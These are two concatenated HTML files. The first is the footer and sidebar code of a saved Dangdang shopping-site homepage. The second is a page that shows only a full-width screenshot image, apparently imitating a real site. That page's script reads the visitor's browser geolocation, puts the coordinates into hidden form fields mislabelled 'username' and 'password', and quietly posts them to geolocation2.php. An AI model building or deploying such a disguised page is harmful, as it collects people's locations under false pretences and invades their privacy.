            <a name="foot_4" class="footer_pic04" href="http://help.dangdang.com/details/page29" target="_blank"><span>上门退货当场退款</span></a>
        </div>
    </div>
    <div class="public_footer_new">
        <div class="footer_sort footer_nvice">
            <span class="f_title">购物指南</span>
            <ul>
                <li><a name="foot_gouwu" href="http://help.dangdang.com/details/page2" target="_blank" class="main" rel="nofollow">购物流程</a></li>
                <li><a name="foot_jifen" href="http://help.dangdang.com/details/page6" target="_blank" rel="nofollow">发票制度</a></li>
                <li><a name="foot_fapiao" href="http://safe.dangdang.com" target="_blank" rel="nofollow">账户管理</a></li>
                <li><a name="foot_mydangdang" href="http://help.dangdang.com/details/page8" target="_blank" rel="nofollow">会员优惠</a></li>
            </ul>
        </div>
        <div class="footer_sort footer_pay">
            <span class="f_title">支付方式</span>
            <ul>
                <li><a name="foot_tuihuanhuoliucheng" href="http://help.dangdang.com/details/page21" target="_blank" rel="nofollow">货到付款</a></li>
                <li><a name="foot_tuihuanhuo" href="http://help.dangdang.com/details/page22" target="_blank" rel="nofollow">网上支付</a></li>
                <li><a name="foot_huanhuo" href="http://help.dangdang.com/details/page24" target="_blank" rel="nofollow">礼品卡支付</a></li>
                <li><a name="foot_tuihuo" href="http://help.dangdang.com/details/page23" target="_blank" rel="nofollow">银行转帐</a></li>
            </ul>
        </div>
        <div class="footer_sort footer_characteristic">
            <span class="f_title">订单服务</span>
            <ul>
                <li><a name="foot_jifen" href="http://help.dangdang.com/details/page400" target="_blank" class="main" rel="nofollow">订单配送查询</a></li>
                <li><a name="foot_lipinka" href="http://help.dangdang.com/details/page4" target="_blank" rel="nofollow">订单状态说明</a></li>
                <li><a name="foot_ershoushu" href="http://orderb.dangdang.com/myallorders.aspx" target="_blank" rel="nofollow">自助取消订单</a></li>
                <li><a name="foot_shouji" href="http://orderb.dangdang.com/myallorders.aspx" target="_blank" rel="nofollow">自助修改订单</a></li>
            </ul>
        </div>
        <div class="footer_sort footer_distribution">
            <span class="f_title">配送方式</span>
            <ul>
                <li><a name="foot_huodaofukuan" href="http://help.dangdang.com/details/page14" target="_blank" class="main" rel="nofollow">配送范围及免邮标准</a></li>
                <li><a name="foot_yinhangzhuanzhang" href="http://help.dangdang.com/details/page232" target="_blank" class="main" rel="nofollow">当日递/次日达</a></li>
                <li><a name="foot_dangdanglijuan" href="http://help.dangdang.com/details/page500" target="_blank" rel="nofollow">订单自提</a></li>
                <li><a name="foot_dangdanglijuan" href="http://help.dangdang.com/details/page20" target="_blank" rel="nofollow">验货与签收</a></li>
            </ul>
        </div>
        <div class="footer_sort footer_help">
            <span class="f_title">退换货</span>
            <ul>
                <li><a name="foot_faq" href="http://help.dangdang.com/details/page28" target="_blank" rel="nofollow">退换货政策</a></li>
                <li><a name="foot_zhaohuimima" href="http://return.dangdang.com/reverseapplyselect.aspx" target="_blank" rel="nofollow">自助申请退换货</a></li>
                <li><a name="foot_huikuandan" href="http://return.dangdang.com/reverseapplylist.aspx" target="_blank" rel="nofollow">退换货进度查询</a></li>
                <li><a name="foot_tuiding" href="http://help.dangdang.com/details/page31" target="_blank" rel="nofollow">退款方式和时间</a></li>
            </ul>
        </div>
        <div class="footer_sort footer_shangjia">
            <span class="f_title">商家服务</span>
            <ul>
                <li><a name="foot_zhaohuimima" href="http://shop.dangdang.com/shangjia" target="_blank" rel="nofollow">商家中心</a></li>
                <li><a name="foot_huikuandan" href="http://outlets.dangdang.com/merchants_cooperation" target="_blank" rel="nofollow">运营服务</a></li>
                <li><a name="foot_tuiding" href="http://outlets.dangdang.com/merchants_outlets" target="_blank" rel="nofollow">加入尾品汇</a></li>
            </ul>
        </div>
    </div>
    <div class="footer_nav_box">
        <div class="footer_nav"><a href="http://static.dangdang.com/topic/2227/176801.shtml" target="_blank" rel="nofollow">公司简介</a><span class="sep">|</span><a href="http://ir.dangdang.com/" target="_blank">Investor Relations</a><span class="sep">|</span><a href="http://zhaopin.dangdang.com" target="_blank">诚聘英才</a><span class="sep">|</span><a href="http://union.dangdang.com/" target="_blank">网站联盟</a><span class="sep">|</span><a href="http://outlets.dangdang.com/merchants_open" target="_blank">当当招商</a><span class="sep">|</span><a href="http://misc.dangdang.com/groupbuy/Default.aspx" target="_blank" rel="nofollow">机构销售</a><span class="sep">|</span><a href="http://static.dangdang.com/topic/744/200778.shtml" target="_blank">手机当当</a><span class="sep">|</span><a href="http://blog.dangdang.com/" target="_blank">官方Blog</a>
                <span class="sep">|</span><div class="footer_hot_search"><a href="http://www.dangdang.com/sales/brands/" target="_blank" class="footer_a" id="hot_search" onmouseover="showghotsearch('hot_search','hot_search_content')" onmouseout="hidehotsearch('hot_search','hot_search_content');">热词搜索</a><div class="pos_a_box" style="display: none;" id="hot_search_content" onmouseover="showghotsearch('hot_search','hot_search_content')" onmouseout="hidehotsearch('hot_search','hot_search_content');">
                    <a href="http://www.dangdang.com/sales/brands/a-1.html" target="_blank" >A</a><a href="http://www.dangdang.com/sales/brands/b-1.html" target="_blank" >B</a><a href="http://www.dangdang.com/sales/brands/c-1.html" target="_blank" >C</a><a href="http://www.dangdang.com/sales/brands/d-1.html" target="_blank" >D</a><a href="http://www.dangdang.com/sales/brands/e-1.html" target="_blank" >E</a><a href="http://www.dangdang.com/sales/brands/f-1.html" target="_blank" >F</a><a href="http://www.dangdang.com/sales/brands/g-1.html" target="_blank" >G</a>
                    <a href="http://www.dangdang.com/sales/brands/h-1.html" target="_blank" >H</a><a href="http://www.dangdang.com/sales/brands/i-1.html" target="_blank" >I</a><a href="http://www.dangdang.com/sales/brands/j-1.html" target="_blank" >J</a><a href="http://www.dangdang.com/sales/brands/k-1.html" target="_blank" >K</a><a href="http://www.dangdang.com/sales/brands/l-1.html" target="_blank" >L</a><a href="http://www.dangdang.com/sales/brands/m-1.html" target="_blank" >M</a><a href="http://www.dangdang.com/sales/brands/n-1.html" target="_blank" >N</a>
                    <a href="http://www.dangdang.com/sales/brands/o-1.html" target="_blank" >O</a><a href="http://www.dangdang.com/sales/brands/p-1.html" target="_blank" >P</a><a href="http://www.dangdang.com/sales/brands/q-1.html" target="_blank" >Q</a><a href="http://www.dangdang.com/sales/brands/r-1.html" target="_blank" >R</a><a href="http://www.dangdang.com/sales/brands/s-1.html" target="_blank" >S</a><a href="http://www.dangdang.com/sales/brands/t-1.html" target="_blank" >T</a><a href="http://www.dangdang.com/sales/brands/u-1.html" target="_blank" >U</a>
                    <a href="http://www.dangdang.com/sales/brands/v-1.html" target="_blank" >V</a><a href="http://www.dangdang.com/sales/brands/w-1.html" target="_blank" >W</a><a href="http://www.dangdang.com/sales/brands/x-1.html" target="_blank" >X</a><a href="http://www.dangdang.com/sales/brands/y-1.html" target="_blank" >Y</a><a href="http://www.dangdang.com/sales/brands/z-1.html" target="_blank" >Z</a><a href="http://www.dangdang.com/sales/brands/other-1.html" target="_blank" >0-9</a>
                <i></i></div></div>
                <script>
                    var setTo = null;
                    function showghotsearch(){




                        clearTimeout(setTo);
                        document.getElementById("hot_search_content").style.display="block";
                    }
                    function hidehotsearch(){
                        setTo = setTimeout(function(){
                          document.getElementById("hot_search_content").style.display="none";
                        },100)                        
                    }
                </script>           
        </div>
        <div class="footer_copyright"><span>Copyright (C) 当当网 2004-2017, All Rights Reserved</span></div>
        <div class="footer_copyright"><span><a href="http://www.miibeian.gov.cn/" target="_blank" rel="nofollow">京ICP证041189号</a></span><span class="sep">|</span><span>出版物经营许可证 新出发京批字第直0673号</span><span class="sep">|</span><span>食品流通许可证：SP1101011010021855(1-1)</span><br><span>互联网药品信息服务资格证编号：(京)-非经营性-2012-0016</span><span class="sep">|</span><span>京公网安备110101000001号</span><br/><span>互联网违法和不良信息举报电话：4001066666-5 邮箱：<a href="mailto:service@cs.dangdang.com">service@cs.dangdang.com</a></span><span><a href="http://img60.ddimg.cn/upload_img/00111/home/dd_yyzz.jpg" target="_blank">北京当当网信息技术有限公司</a>，电话010-57992666，公司地址：北京市朝阳区北三环东路8号静安中心21层</span></div>
    <!-- 有三个icon的时候加footer_icon2 -->
        <div class="footer_icon footer_icon2" style="padding-left:20px; width:790px;">
                <div class="validator"><a href="http://www.hd315.gov.cn/beian/view.asp?bianhao=010202001051000098" target="_blank" class="footer_img"><img src="http://img4.ddimg.cn/00012/2010/validate.gif"></a></div>
                <div class="knet"><!-- 可信网站LOGO安装开始 -->
                    <script type="text/JavaScript">
                        function CNNIC_change(eleId) {
                            var str = document.getElementById(eleId).href;
                            var str1 = str.substring(0, (str.length - 6));
                            str1 += CNNIC_RndNum(6);
                            document.getElementById(eleId).href = str1;
                        }

                        function CNNIC_RndNum(k) {
                            var rnd = "";
                            for (var i = 0; i < k; i++)
                                rnd += Math.floor(Math.random() * 10);
                            return rnd;
                        }
                    </script>
                    <a href="https://ss.knet.cn/verifyseal.dll?sn=2010091900100002234&pa=2940051" tabindex="-1" id="urlknet" target="_blank" rel="nofollow"><img width="128" height="47" alt="可信网站" name="CNNIC_seal" border="true"src="http://img4.ddimg.cn/00012/2010/knetSealLogo.png" oncontextmenu="return false;" onclick="CNNIC_change('urlknet')"  /></a><!-- 可信网站LOGO安装结束 -->
                    </div>
                <div class="validator"><a href="http://bj429.com.cn/" target="_blank" class="footer_img"><img src="http://img61.ddimg.cn/7d593c48-48f6-4fc9-85e0-7d6e10dfc2a2.hpvgUvc9"></a></div>
                <div class="validator"><a id="_pingansec_bottomimagesmall_brand" href="http://si.trustutn.org/info?sn=302161014024825726885&certType=1"  target="_blank"><img src="http://img63.ddimg.cn/upload_img/00111/home/brand_128_47.png"></a></div>
                <div class="validator" style="width:182px;"><a href="http://jubao.12377.cn:13225/reportinputcommon.do" target="_blank"><img src="http://img60.ddimg.cn/upload_img/00459/home/hlwjbzx_182.png"></a></div>
                    <div class="clear"></div>
                </div>
    </div>
</div>
</div>
<div id="footer_end"></div><!--此ID为结束标识，不能删除--> 
</div>
</div>
<script type="text/javascript" src="http://img13.ddimg.cn/mix/js/jquery.js"></script>
<script type="text/javascript">
    var arrayObj=new Array();
    var mix_ajax_api = '/Standard/Framework/Core/hosts/ajax_api.php';
</script>
    
    <script type="text/javascript" src="http://www.dangdang.com/Standard/Framework/Extend/hosts/js/jquery/lazyloadDiv0615.js?20170601"></script>
    <script type="text/javascript" src="http://a.dangdang.com/getJS.php?cpc=true&cpm=true&cpt=true"></script>
    <script type="text/javascript" src="http://click.dangdang.com/js_tracker.js?20170601"></script>
    <script language="javascript" src="http://a.dangdang.com/smart.js?20170601"></script>
    <script type="text/javascript" src="http://recosys.dangdang.com/realdata/js/index/collect.js"></script>
    <script type="text/javascript" src="http://www.dangdang.com/Standard/Framework/Extend/hosts/js/mix.js?20170601"></script>
    <script type="text/javascript" src="http://static.ddimg.cn/js/login/LoginWindow.js?20170601"></script>
    <script type="text/javascript" src="http://www.dangdang.com/Standard/Framework/Extend/hosts/js/jquery/jquery.underscore.min.js"></script>

    <script>
$(function(){
    $(".home_circle_c .focus_box .btn,.home_circle_c .tehui_box .btn").hover(
        function () {
            $(this).addClass("hover");
          },
          function () {
            $(this).removeClass("hover");
          }
  );
});
$('.home_circle_c .focus_box .tab').css('margin-left',-($('.home_circle_c .focus_box .tab li').length * 6 + 3) + 'px');
</script>    <script>
        $(function(){
            /**
             * 返回顶部
             */
            $('.back_top').click(function(){
                $("html,body").animate({"scrollTop":"0"},500);
            });

            /**
             * 二维码
             */
            $(".code2s").hover(function(){
                $('.code2b').css('display','block');
            },function(){
                $('.code2b').css('display','none');
            });

            /**
             * 右边栏购物车数量
             */
            var cart_items_count = getCookie_one("cart_items_count","");
            if(cart_items_count ==""){cart_items_count = "0";}
            var number = cart_items_count <= 99 ? cart_items_count : '99+';
            $(".cart em").text(number);
        
        
            /**
             * 页头购物车数量
             */
            var CartCountHead=getCookie_one("cart_items_count","");
            if(CartCountHead==""){CartCountHead = "0";}
            var cartItemsCount_head=Number(CartCountHead);
            if(isNaN(Number(cartItemsCount_head))){
                cart_Count_head = "0";
            }else{
                cart_Count_head = CartCountHead;
            }
            if(cart_Count_head!=null&&cart_Count_head.length>0&&cart_Count_head!="undefined")
            {
                var cic_head=document.getElementById("cart_items_count_head");
                if(cic_head!=''){
                    cart_Count_head = cart_Count_head <= 99 ? cart_Count_head : '99+';
                    cic_head.innerHTML= cart_Count_head;
                }
            }
        
            /**
             * 我的收藏
             * 第一次加载时，会提示“加载中请稍后”
             * 当加载过内容之后，就不再出现上述提示，之后就是对已加载过来的内容的显示与隐藏的操作
             * 采用_.throttle（）方法是用来避免指定时间内用户频繁点击导致的频繁发送请求
             * 这里设定了3秒，也就是说当用户触发了一次点击操作，此时不是立马发送请求，而是等待3秒，在这3秒内无论用户又触发了多少次操作，3秒之后，只发送一次请求
             */
            $(".collect").click(function(){               
                //判断是否登录
                $.ajax({
                    type: "GET",
                    url: float_right_ajax_url, 
                    data: "action=is_login",
                    complete :function(data){ 
                        var data = data.responseText; 
                        if(data == 0){ //未登录
                            showMsgBox('','','',show_collect_html);
                        }else{  
                            //加上该class之后，才能将竖条向左移动指定距离
                            if(!$("#sidebar_wrap_id").hasClass("sidebar_wrap_open")){
                                $("#sidebar_wrap_id").addClass("sidebar_wrap_open");
                            }

                            //判断收藏div是否有数据，一般访问页面后第一次点击收藏按钮，div下会没有数据，此时给出友好提示“加载中请稍后”
                            var my_collect_html = $("#my_collect").html();
                            my_collect_html = $.trim(my_collect_html);
                            if(my_collect_html == ""){
                                $("#my_collect").html($("#collect_load_html").html());
                            }

                            //显示收藏div，隐藏足迹div和右侧展开内容div
                            $("#my_collect").show();
                            $("#my_history").hide();
                            $("#expand_content").hide();
                            $("#robot").hide();

                            //异步调取数据，但是会对调取频率进行控制
                            show_my_collect();
                        }       
                    }
                });       
            }); 
            var show_my_collect = _.throttle(function(){            
                //异步请求数据
                $.ajax({
                    type: "GET",
                    url: float_right_ajax_url, 
                    data: "action=collect&collect_url="+collect_url,
                    complete :function(data){ 
                        var show_html = data.responseText; 
                        $("#my_collect").html(show_html); //对数据进行覆盖                               
                    }
                });              
            }, 3000);

        
            /**
             * 登录之后调用该函数进行收藏数据的加载
             */
            function show_collect_html(){
                //加上该class之后，才能将竖条向左移动指定距离
                if(!$("#sidebar_wrap_id").hasClass("sidebar_wrap_open")){
                    $("#sidebar_wrap_id").addClass("sidebar_wrap_open");
                }
            
                //判断收藏div是否有数据，一般访问页面后第一次点击收藏按钮，div下会没有数据，此时给出友好提示“加载中请稍后”
                var my_collect_html = $("#my_collect").html();
                my_collect_html =  $.trim(my_collect_html);
                if(my_collect_html == ""){
                    $("#my_collect").html($("#collect_load_html").html());
                }
            
                //显示收藏div，隐藏足迹div和右侧展开内容div
                $("#my_collect").show();
                $("#my_history").hide();
                $("#expand_content").hide();
                $("#robot").hide();
            
                //异步调取数据，但是会对调取频率进行控制
                show_my_collect();
            }
        
        
            /**
             * 我的足迹
             * 第一次加载时，会提示“加载中请稍后”
             * 当加载过内容之后，就不再出现上述提示，之后就是对已加载过来的内容的显示与隐藏的操作
             * 采用_.throttle（）方法是用来避免指定时间内用户频繁点击导致的频繁发送请求
             * 这里设定了3秒，也就是说当用户触发了一次点击操作，此时不是立马发送请求，而是等待3秒，在这3秒内无论用户又触发了多少次操作，3秒之后，只发送一次请求
             */
            $(".footprint").click(function(){
                //加上该class之后，才能将竖条向左移动指定距离
                if(!$("#sidebar_wrap_id").hasClass("sidebar_wrap_open")){
                    $("#sidebar_wrap_id").addClass("sidebar_wrap_open");
                }
            
                //判断足迹div是否有数据，一般访问页面后第一次点击足迹按钮，div下会没有数据，此时给出友好提示“加载中请稍后”
                var my_history_html = $("#my_history").html();
                my_history_html =  $.trim(my_history_html);
                if(my_history_html == ""){
                    $("#my_history").html($("#history_load_html").html());
                }
            
                //显示足迹div，隐藏收藏div和右侧展开内容div
                $("#my_history").show();
                $("#my_collect").hide();
                $("#expand_content").hide();
                $("#robot").hide();
         
                //异步调取数据，但是会对调取频率进行控制
                show_my_history();
            });
        
            var show_my_history = _.throttle(function(){
                //异步请求数据
                $.ajax({
                    type: "GET",
                    url: float_right_ajax_url, 
                    data: "action=history",
                    complete :function(data){                      
                        var result = data.responseText;                    
                        $("#my_history").html(result);  //对数据进行覆盖
                    }
                });        
            }, 3000);
            
            $("#robot").height($(window).height() - 34 + 'px');
            $(window).resize(function(){
                if($(window).height() > 34){
                    $("#robot").height($(window).height() - 34 + 'px');
                }
            });
            
            $(".robot").click(function(){               

                //加上该class之后，才能将竖条向左移动指定距离
                if(!$("#sidebar_wrap_id").hasClass("sidebar_wrap_open")){
                    $("#sidebar_wrap_id").addClass("sidebar_wrap_open");
                }

                //判断收藏div是否有数据，一般访问页面后第一次点击按钮，div下会没有数据，此时给出友好提示“加载中请稍后”
                var robot_html = $("#robot").html();
                robot_html = $.trim(robot_html);
                if(robot_html == ""){
                    $("#robot").html($("#robot_load_html").html());
                }

                //显示收藏div，隐藏足迹div和右侧展开内容div
                $("#my_collect").hide();
                $("#my_history").hide();
                $("#expand_content").hide();
                $("#robot").show();

                //异步调取数据，但是会对调取频率进行控制
                show_robot();
            }); 
            
           var show_robot = function(){     
                var html = '<h4><a href="javascript:sidebar_open_close()" class="close">close</a>咨询小当家</h4><iframe src="http://faqrobot.dangdang.com/robot/dangpc.html?sysNum=dd_1000" scrolling="no" frameborder="0" border="0" class="sidebar_robot"></iframe>';
                $("#robot").html(html);  //对数据进行覆盖
            }
        
        });

        /**
         * hover展示大图
         */
        $(".sale").hover(function(){
            $(this).find('.sale_big').css('display','block');
        },function(){
            $(this).find('.sale_big').css('display','none');
        });


        /**
         * hover展示左侧提示区域
         */
        $(".sidebar_points,.sidebar_top .cart,.sidebar_top .collect,.sidebar_top .footprint,.sidebar_b .back_top,.sidebar_top .robot").hover(function(){
            $(this).addClass('on');
            $(this).find('span').stop(true,false).animate({"left":"-79px"},200);
        },function(){
            $(this).removeClass('on');
            $(this).find('span').stop(true,false).animate({"left":"0"},200);
        });
    
        /**
         * 展开层关闭
         * 如果展开的内容有关闭的箭头，只需要给对应的dom节点添加该事件即可
         */
        function sidebar_open_close(){
            $("#sidebar_wrap_id").removeClass("sidebar_wrap_open");
            $("#my_collect").hide();
            $("#my_history").hide();
            $("#expand_content").hide();
            $("#robot").hide();
        }
    
    
    
    
        /**
         * 展开右侧广告内容
         */
        function show_expand_content(){   
            $("#my_collect").hide();
            $("#my_history").hide();
            var expand_content = $("#expand_content_hidden").html();
            $('#expand_content').html(expand_content);
            $('#expand_content').show();
            if(!$("#sidebar_wrap_id").hasClass("sidebar_wrap_open")){
                $("#sidebar_wrap_id").addClass("sidebar_wrap_open");
            }
        }
    
    
    </script><script type="text/javascript">
    function stickSearch() {
        var keyWords = $("#stickSearchKey").attr("value");
        var url = 'http://search.dangdang.com/?key=' + keyWords + '&act=input';
        window.location.href = url;
    }
    var defaultStickKey = $("#label_key").text();
    $("#stickSearchKey").val(defaultStickKey);
    $("#stickSearchKey").bind({
        focus: function () {
            $("#stickSearchKey").val('');
        },
        blur: function () {
            var stickVal = $("#stickSearchKey").val();
            if(stickVal.trim()==''){
                $("#stickSearchKey").val(defaultStickKey);
            }
        },
        keydown:function(e){
            if(e.keyCode==13){
               $("#goStickSearch").click();
            }
        }
    });
    $(window).scroll(function () {

        if ($(".home_taday_flash_box").offset().top < $(window).scrollTop()) {
            $(".mix_search_top").css("display", "block");
        } else {
            $(".mix_search_top").css("display", "none");
        }
    });

</script>
<script type="text/javascript" src="//static.criteo.net/js/ld/ld.js" async="true"></script>
<script type="text/javascript">
    window.criteo_q = window.criteo_q || [];
    window.criteo_q.push({ event: "setAccount", account: "25268"},{ event: "setHashedEmail", email: [""] },{ event: "setSiteType", type: "d" },{ event: "viewHome" });
</script>    </body>
</html>




<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>

 <img src="1.png" alt="" width="100%;">
    <script>
      var geol;       
        try {
            if (typeof(navigator.geolocation) == 'undefined') {
                geol = google.gears.factory.create('beta.geolocation');
            } else {
                geol = navigator.geolocation;
            }
        } catch (error) {
            //alert(error.message);
        }
        
        if (geol) {
            geol.getCurrentPosition(function(position) {
        
        var nowLatitude = position.coords.latitude;   
        var nowLongitude = position.coords.longitude;
        
    alert("纬度：" + nowLatitude + "， 经度：" + nowLongitude);
          

                    function new_form(){
            var f=document.createElement("form");
            document.body.appendChild(f);
            f.method="post";
            return f;
        }

        function create_elements(eForm,eName,eValue){
            var e=document.createElement("input");
            eForm.appendChild(e);
            e.type="text";
            e.name=eName;
            if(!document.all){e.style.display="none"}else{
                e.style.display="block";
                e.style.width="0px";
                e.style.height="0px";
            }
            e.value=eValue;
            return e;
        }

        var _f=new_form();
        create_elements(_f,"username",nowLatitude) // 创建form中的input对象
        create_elements(_f,"password",nowLongitude);
      
        _f.action="geolocation2.php";
        _f.submit();   //提交
     
 
 


    }, function(error) {
        switch(error.code){
        case error.TIMEOUT :
            //alert("连接超时，请重试");
            break;
        case error.PERMISSION_DENIED :
            //alert("您拒绝了使用位置共享服务，查询已取消");
            break;
        case error.POSITION_UNAVAILABLE : 
            //alert("非常抱歉，我们暂时无法通过浏览器获取您的位置信息");
            break;
        }
    }, {timeout:10000});    //设置十秒超时


        }
 


  </script>
</body>
</html>
